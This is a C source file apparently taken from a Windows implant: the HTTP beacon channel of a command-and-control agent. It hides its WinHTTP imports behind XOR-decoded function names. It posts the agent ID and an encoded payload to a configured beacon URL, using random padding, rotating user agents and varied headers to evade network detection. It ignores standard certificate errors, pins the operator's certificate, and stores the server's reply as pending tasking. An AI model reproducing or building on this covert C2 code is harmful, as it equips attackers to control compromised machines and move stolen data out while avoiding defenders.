#include "channels.h"
#include "crypto.h"
#include "util.h"
#include "agent_config.h"
#include "evs_strings.h"
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* WinHTTP dynamic dispatch */

typedef BOOL(WINAPI *fn_WH_CrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
typedef HINTERNET(WINAPI *fn_WH_Open)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI *fn_WH_Connect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI *fn_WH_OpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR *, DWORD);
typedef BOOL(WINAPI *fn_WH_SetOption)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI *fn_WH_AddHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);
typedef BOOL(WINAPI *fn_WH_SetTimeouts)(HINTERNET, int, int, int, int);
typedef BOOL(WINAPI *fn_WH_SendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI *fn_WH_RecvResponse)(HINTERNET, LPVOID);
typedef BOOL(WINAPI *fn_WH_QueryOption)(HINTERNET, DWORD, LPVOID, LPDWORD);
typedef BOOL(WINAPI *fn_WH_QueryAvail)(HINTERNET, LPDWORD);
typedef BOOL(WINAPI *fn_WH_ReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *fn_WH_Close)(HINTERNET);

typedef struct
{
    fn_WH_CrackUrl CrackUrl;
    fn_WH_Open Open;
    fn_WH_Connect Connect;
    fn_WH_OpenRequest OpenRequest;
    fn_WH_SetOption SetOption;
    fn_WH_AddHeaders AddHeaders;
    fn_WH_SetTimeouts SetTimeouts;
    fn_WH_SendRequest SendRequest;
    fn_WH_RecvResponse RecvResponse;
    fn_WH_QueryOption QueryOption;
    fn_WH_QueryAvail QueryAvail;
    fn_WH_ReadData ReadData;
    fn_WH_Close Close;
} wh_t;

static wh_t _wh = {0};

static int _wh_init(void)
{
    if (_wh.Open)
        return 0;
    char _dll[12];
    {
        volatile unsigned char _k = EVS_KEY;
        for (int _i = 0; _i < (int)sizeof(EVS_dll_winhttp); _i++)
            _dll[_i] = (char)(EVS_dll_winhttp[_i] ^ _k);
        _dll[sizeof(EVS_dll_winhttp)] = '\0';
    }
    HMODULE h = LoadLibraryA(_dll);
    SecureZeroMemory(_dll, sizeof(_dll));
    if (!h)
        return -1;

    char _fn[32];
    volatile unsigned char _k = EVS_KEY;
#define _GPA(enc, ftype, field)                       \
    do                                                \
    {                                                 \
        for (int _i = 0; _i < (int)sizeof(enc); _i++) \
            _fn[_i] = (char)((enc)[_i] ^ _k);         \
        _fn[sizeof(enc)] = '\0';                      \
        _wh.field = (ftype)GetProcAddress(h, _fn);    \
        SecureZeroMemory(_fn, sizeof(enc) + 1);       \
    } while (0)

    _GPA(EVS_fn_WinHttpCrackUrl, fn_WH_CrackUrl, CrackUrl);
    _GPA(EVS_fn_WinHttpOpen, fn_WH_Open, Open);
    _GPA(EVS_fn_WinHttpConnect, fn_WH_Connect, Connect);
    _GPA(EVS_fn_WinHttpOpenRequest, fn_WH_OpenRequest, OpenRequest);
    _GPA(EVS_fn_WinHttpSetOption, fn_WH_SetOption, SetOption);
    _GPA(EVS_fn_WinHttpAddRequestHeaders, fn_WH_AddHeaders, AddHeaders);
    _GPA(EVS_fn_WinHttpSetTimeouts, fn_WH_SetTimeouts, SetTimeouts);
    _GPA(EVS_fn_WinHttpSendRequest, fn_WH_SendRequest, SendRequest);
    _GPA(EVS_fn_WinHttpReceiveResponse, fn_WH_RecvResponse, RecvResponse);
    _GPA(EVS_fn_WinHttpQueryOption, fn_WH_QueryOption, QueryOption);
    _GPA(EVS_fn_WinHttpQueryDataAvailable, fn_WH_QueryAvail, QueryAvail);
    _GPA(EVS_fn_WinHttpReadData, fn_WH_ReadData, ReadData);
    _GPA(EVS_fn_WinHttpCloseHandle, fn_WH_Close, Close);
#undef _GPA

    return _wh.Open ? 0 : -1;
}

/*  Helpers  */

static char s_pending[131072];
static int s_pending_set = 0;

static int json_str(const char *json, const char *key, char *out, size_t out_sz)
{
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = strstr(json, needle);
    if (!p)
        return -1;
    p += strlen(needle);
    while (*p == ' ')
        p++;
    if (*p != '"')
        return -1;
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz - 1)
    {
        if (*p == '\\' && *(p + 1))
            p++;
        out[i++] = *p++;
    }
    out[i] = '\0';
    return 0;
}

static wchar_t *_to_wide(const char *s)
{
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (n <= 0)
        return NULL;
    wchar_t *w = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (!w)
        return NULL;
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

/*  Certificate pinning  */

static int _cert_pin_check(HINTERNET hRequest)
{
#if CFG_CERT_PIN_LEN != 64
    (void)hRequest;
    return 0;
#else
    uint8_t expected[32];
    {
        char hex[65] = {0};
        for (int i = 0; i < 64; i++)
            hex[i] = (char)(CFG_CERT_PIN[i] ^ CFG_XOR_KEY[i % CFG_XOR_KEY_LEN]);
        for (int i = 0; i < 32; i++)
        {
            char h[3] = {hex[i * 2], hex[i * 2 + 1], '\0'};
            expected[i] = (uint8_t)strtoul(h, NULL, 16);
        }
    }

    PCCERT_CONTEXT pCert = NULL;
    DWORD certSz = sizeof(PCCERT_CONTEXT);
    if (!_wh.QueryOption(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
                         &pCert, &certSz) ||
        !pCert)
        return -1;

    uint8_t got[32] = {0};
    {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_HASH_HANDLE hHash = NULL;
        DWORD objSz = 0, cbRes = 0;
        uint8_t *hashObj = NULL;

        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0)
            goto pin_fail;
        if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                              (PBYTE)&objSz, sizeof(DWORD), &cbRes, 0) != 0)
            goto pin_fail;
        hashObj = (uint8_t *)malloc(objSz);
        if (!hashObj)
            goto pin_fail;
        if (BCryptCreateHash(hAlg, &hHash, hashObj, objSz, NULL, 0, 0) != 0)
            goto pin_fail;
        BCryptHashData(hHash, pCert->pbCertEncoded, pCert->cbCertEncoded, 0);
        BCryptFinishHash(hHash, got, 32, 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        free(hashObj);
        CertFreeCertificateContext(pCert);
        return (memcmp(got, expected, 32) == 0) ? 0 : -1;

    pin_fail:
        if (hHash)
            BCryptDestroyHash(hHash);
        if (hAlg)
            BCryptCloseAlgorithmProvider(hAlg, 0);
        free(hashObj);
        CertFreeCertificateContext(pCert);
        return -1;
    }
#endif
}

/*  Beacon send  */

int http_send(const channel_config_t *cfg, const char *agent_id, const char *b64)
{
    if (!cfg->beacon_url[0])
        return CHANNEL_ERR;
    if (_wh_init() != 0)
        return CHANNEL_ERR;
    s_pending_set = 0;

    wchar_t *url_w = _to_wide(cfg->beacon_url);
    if (!url_w)
        return CHANNEL_ERR;

    wchar_t host[256] = {0};
    wchar_t path[1024] = {0};

    URL_COMPONENTS uc;
    memset(&uc, 0, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = host;
    uc.dwHostNameLength = 256;
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = 1024;

    if (!_wh.CrackUrl(url_w, 0, 0, &uc))
    {
        free(url_w);
        return CHANNEL_ERR;
    }
    free(url_w);

    BOOL secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    INTERNET_PORT port = uc.nPort ? uc.nPort : (INTERNET_PORT)(secure ? 443 : 80);

    /* cryptographic random padding to vary request size */
    char pad_b64[72] = {0};
    {
        uint8_t raw[36];
        uint32_t rnd = 0;
        BCryptGenRandom(NULL, (BYTE *)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        DWORD pad_len = 8 + (rnd % 29);
        if (BCryptGenRandom(NULL, raw, pad_len, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0)
        {
            char *enc = base64_encode(raw, pad_len);
            if (enc)
            {
                strncpy(pad_b64, enc, sizeof(pad_b64) - 1);
                free(enc);
            }
        }
    }

    size_t body_sz = strlen(b64) + strlen(pad_b64) + 160;
    char *body = (char *)malloc(body_sz);
    if (!body)
        return CHANNEL_ERR;
    if (pad_b64[0])
        snprintf(body, body_sz, "{\"id\":\"%s\",\"p\":\"%s\",\"_t\":\"%s\"}", agent_id, b64, pad_b64);
    else
        snprintf(body, body_sz, "{\"id\":\"%s\",\"p\":\"%s\"}", agent_id, b64);

    const char *ua_str = (cfg->http_useragent[0]) ? cfg->http_useragent : random_ua();
    wchar_t *ua_w = _to_wide(ua_str);
    HINTERNET hSession = _wh.Open(
        ua_w ? ua_w : L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    free(ua_w);

    if (!hSession)
    {
        free(body);
        return CHANNEL_ERR;
    }

    HINTERNET hConnect = _wh.Connect(hSession, host, port, 0);
    if (!hConnect)
    {
        _wh.Close(hSession);
        free(body);
        return CHANNEL_ERR;
    }

    DWORD req_flags = secure ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = _wh.OpenRequest(hConnect, L"POST",
                                         path[0] ? path : L"/",
                                         NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, req_flags);
    if (!hRequest)
    {
        _wh.Close(hConnect);
        _wh.Close(hSession);
        free(body);
        return CHANNEL_ERR;
    }

    if (secure)
    {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        _wh.SetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                      &sec_flags, sizeof(sec_flags));
    }

    _wh.AddHeaders(hRequest,
                   L"Content-Type: application/json\r\nAccept: application/json",
                   (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    /* Per-beacon header variation */
    {
        static const wchar_t *_langs[] = {
            L"Accept-Language: en-US,en;q=0.9\r\n",
            L"Accept-Language: en-GB,en;q=0.8,en-US;q=0.7\r\n",
            L"Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8\r\n",
            L"Accept-Language: de-DE,de;q=0.9,en;q=0.8\r\n",
        };
        static const wchar_t *_encs[] = {
            L"Accept-Encoding: gzip, deflate, br\r\n",
            L"Accept-Encoding: gzip, deflate\r\n",
            L"Accept-Encoding: br, gzip\r\n",
        };
        uint32_t _r = 0;
        BCryptGenRandom(NULL, (BYTE *)&_r, sizeof(_r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        _wh.AddHeaders(hRequest, _langs[_r % 4], (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        _wh.AddHeaders(hRequest, _encs[(_r >> 8) % 3], (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        _wh.AddHeaders(hRequest,
                       L"Cache-Control: no-cache, no-store\r\n",
                       (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        wchar_t _ref[512];
        swprintf(_ref, 512, L"Referer: https://%ls/\r\n", host);
        _wh.AddHeaders(hRequest, _ref, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    }

    if (cfg->http_extra_headers[0])
    {
        wchar_t *xhdr_w = _to_wide(cfg->http_extra_headers);
        if (xhdr_w)
        {
            _wh.AddHeaders(hRequest, xhdr_w, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
            free(xhdr_w);
        }
    }

    _wh.SetTimeouts(hRequest, 30000, 30000, 30000, 30000);

    BOOL ok = _wh.SendRequest(hRequest,
                              WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                              body, (DWORD)strlen(body), (DWORD)strlen(body), 0);
    free(body);

    if (!ok || !_wh.RecvResponse(hRequest, NULL))
    {
        _wh.Close(hRequest);
        _wh.Close(hConnect);
        _wh.Close(hSession);
        return CHANNEL_ERR;
    }

    if (secure && _cert_pin_check(hRequest) != 0)
    {
        _wh.Close(hRequest);
        _wh.Close(hConnect);
        _wh.Close(hSession);
        return CHANNEL_ERR;
    }

    char *resp = NULL;
    size_t resp_len = 0;
    DWORD avail = 0;

    while (_wh.QueryAvail(hRequest, &avail) && avail > 0)
    {
        char *tmp = (char *)realloc(resp, resp_len + avail + 1);
        if (!tmp)
            break;
        resp = tmp;
        DWORD nread = 0;
        _wh.ReadData(hRequest, resp + resp_len, avail, &nread);
        resp_len += nread;
        resp[resp_len] = '\0';
    }

    _wh.Close(hRequest);
    _wh.Close(hConnect);
    _wh.Close(hSession);

    if (resp)
    {
        if (json_str(resp, "p", s_pending, sizeof(s_pending)) == 0 && s_pending[0] != '\0')
            s_pending_set = 1;
        free(resp);
    }

    return CHANNEL_OK;
}

char *http_recv(void)
{
    if (!s_pending_set || !s_pending[0])
        return NULL;
    char *ret = strdup(s_pending);
    s_pending[0] = '\0';
    s_pending_set = 0;
    return ret;
}
